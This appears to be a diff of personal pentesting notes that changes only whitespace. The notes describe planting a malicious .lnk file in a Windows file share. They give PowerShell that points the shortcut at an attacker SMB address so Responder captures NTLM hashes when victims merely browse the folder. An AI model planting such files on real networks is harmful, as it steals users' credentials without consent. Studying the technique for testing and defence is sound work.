@@ -1,13 +1,13 @@
-*(also called URL File Attack)*
+*(also called URL File Attack)*  
 
 
-Watering hole of sorts
+Watering hole of sorts  
 Placing a malicious file in a shared folder so that someone accesses it 
 
-Many ways
+Many ways  
 
 ## Process (Manual)
-Step 1:
+Step 1:  
 If I have access to a fileshare and want to dump a mal file, use this powershell commands:
 ```
 $objShell = New-Object -ComObject WScript.shell
@@ -23,38 +23,38 @@ $lnk.Description = "Test"
 $lnk.HotKey = "Ctrl+Alt+T"
 $lnk.Save()
 ```
-This generates a file and that gets placed in a file share and if responder is up and that mal file is triggered, I can capture a hash
+This generates a file and that gets placed in a file share and if responder is up and that mal file is triggered, I can capture a hash  
 **So basically trying to generate event for responder**
 
-Step 2: 
-Put this in the fileshare
+Step 2:   
+Put this in the fileshare  
 
-Step 3:
-Event happens (victim opens the fileshare that has the .lnk file)
-![Pasted image 20251222191020](images/Pasted-image-20251222191020.png)
+Step 3:  
+Event happens (victim opens the fileshare that has the .lnk file)    
+![Pasted image 20251222191020](images/Pasted-image-20251222191020.png)  
 
-Step 4:
-Explorer tries to resolve the target path in the .lnk metadata
-So when explorer sees: `\\192.168.138.149\@test.png` 
--> Windows initiates an SMB connection
+Step 4:  
+Explorer tries to resolve the target path in the .lnk metadata  
+So when explorer sees: `\\192.168.138.149\@test.png`   
+-> Windows initiates an SMB connection  
 
 
 ---
-#### Note 1: 
-This can be done from any device with windows and not necesarrily from the victim's machine
+#### Note 1:   
+This can be done from any device with windows and not necesarrily from the victim's machine  
 
-#### Note 2:
-Why `@`, `~`, etc.?
-Because **Windows Explorer sorts files lexicographically**, and symbols come before letters.
-This increases the chance that Explorer processes your `.lnk` **first** when enumerating the directory.
+#### Note 2:  
+Why `@`, `~`, etc.?  
+Because **Windows Explorer sorts files lexicographically**, and symbols come before letters.  
+This increases the chance that Explorer processes your `.lnk` **first** when enumerating the directory.  
 
-#### Note 3:
-How does just _viewing_ the file share trigger authentication and leak hashes?
-Because **Windows Explorer automatically resolves metadata for `.lnk` files**, including:
-- Icon location
-- Target path
-And **resolving a UNC path (`\\attacker\...`) triggers SMB authentication automatically**.
-No click required.
+#### Note 3:  
+How does just _viewing_ the file share trigger authentication and leak hashes?  
+Because **Windows Explorer automatically resolves metadata for `.lnk` files**, including:  
+- Icon location  
+- Target path  
+And **resolving a UNC path (`\\attacker\...`) triggers SMB authentication automatically**.  
+No click required.  
 
 ---
 
